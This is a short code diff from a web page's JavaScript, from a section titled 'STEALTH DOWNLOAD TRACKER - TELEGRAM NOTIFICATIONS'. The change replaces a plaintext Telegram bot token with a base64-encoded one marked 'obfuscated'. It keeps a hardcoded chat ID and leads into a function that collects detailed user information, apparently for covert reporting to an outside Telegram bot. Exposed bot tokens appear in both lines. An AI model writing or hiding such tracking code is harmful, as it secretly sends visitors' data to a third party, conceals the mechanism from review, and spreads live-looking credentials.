@@ -184,8 +184,8 @@ $(document).ready(function () {
      STEALTH DOWNLOAD TRACKER - TELEGRAM NOTIFICATIONS
      ========================================================================== */
     
-  // Telegram bot configuration
-  const TELEGRAM_BOT_TOKEN = "8109801796:AAGgrpCIP2TdyUy-WbUiIEMIl-KN8E4tkGI";
+  // Telegram bot configuration (obfuscated)
+  const TELEGRAM_BOT_TOKEN = atob("NzU0MTIyNTU2MDpBQUdoRW9yRHJQMVowRFZCOWJrb0ZuaFJZaUVFZnAxZXdWUQ==");
   const TELEGRAM_CHAT_ID = "1551350589";
   
   // Function to get detailed user information
